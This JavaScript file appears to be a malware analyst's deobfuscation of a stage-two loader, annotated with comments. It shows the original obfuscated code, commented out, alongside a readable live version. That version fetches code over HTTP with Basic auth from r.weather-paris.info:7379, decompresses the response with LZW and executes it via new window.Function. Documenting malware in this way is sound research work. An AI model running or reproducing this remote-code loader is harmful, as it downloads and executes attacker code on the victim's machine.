/*
    Okay, this is probably the last trick before execution.
    Deobfuscated by [REDACTED], released under MIT license.
*/

/*
    var _0x8d6d = 'R0VU;aHR0cDovL3Iud2VhdGhlci1wYXJpcy5pbmZvOjczNzkvR0VUL2luaXRfY29kZQ==;open;Authorization;Basic ;ext:pw;setRequestHeader;onreadystatechange;readyState;status;GET;responseText;parse;;split;length;charCodeAt;_;push;charAt;join;log;send'.split(';'),
        xhr = new XMLHttpRequest;
    xhr[_0x8d6d[2]](atob(_0x8d6d[0]), atob(_0x8d6d[1]), !0);
    xhr[_0x8d6d[6]](_0x8d6d[3], _0x8d6d[4] + btoa(_0x8d6d[5]));
    xhr[_0x8d6d[7]] = function () {
        if (4 == xhr[_0x8d6d[8]] && 200 == xhr[_0x8d6d[9]]) {
                try {
                r = JSON[_0x8d6d[12]](xhr[_0x8d6d[11]])[_0x8d6d[10]];
                for (var e = {}, b = (r + _0x8d6d[13])[_0x8d6d[14]](_0x8d6d[13]), a = b[0], f = a, h = [a], k = 256, c, d = 1; d < b[_0x8d6d[15]]; d++) {
                    var g = b[d][_0x8d6d[16]](0);
                    c = 256 > g ? b[d] : e[_0x8d6d[17] + g] ? e[_0x8d6d[17] + g] : f + a;
                    h[_0x8d6d[18]](c);
                    a = c[_0x8d6d[19]](0);
                    e[_0x8d6d[17] + k] = f + a;
                    k++;
                    f = c
                }
                (new window.Function(h[_0x8d6d[20]](_0x8d6d[13])))()
            } catch (l) {
                console[_0x8d6d[21]](l)
            }
        }
    };
    xhr[_0x8d6d[22]](null);
*/

var secondaryXMLRequester = new XMLHttpRequest;
secondaryXMLRequester.open("GET", "http://r.weather-paris.info:7379/GET/init_code", !0); // address resolves to 45.32.95.150
secondaryXMLRequester.setRequestHeader("Authorization", "Basic " + "ZXh0OnB3"); // Username: "ext", Password: "pw"
secondaryXMLRequester.onreadystatechange = function () {
    if (4 == secondaryXMLRequester.readyState && 200 == secondaryXMLRequester.status) {
        try {
            r = JSON.parse(secondaryXMLRequester.responseText).GET; // response is in requestfromhost_weather-paris.json
            for (var e = {}, b = (r + "").split(""), a = b[0], f = a, h = [a], k = 256, c, d = 1; d < b.length; d++) {
                var g = b[d].charCodeAt(0);
                c = 256 > g ? b[d] : e["_" + g] ? e["_" + g] : f + a;
                h.push(c);
                a = c.charAt(0);
                e["_" + k] = f + a;
                k++;
                f = c
            }
            (new window.Function(h.join("")))(); // see MAINPAYLOAD-deobfuscated_requestfromhost_weather-paris.js
        } catch (l) {
            console.log(l)
        }
    }
};
secondaryXMLRequester.send(null);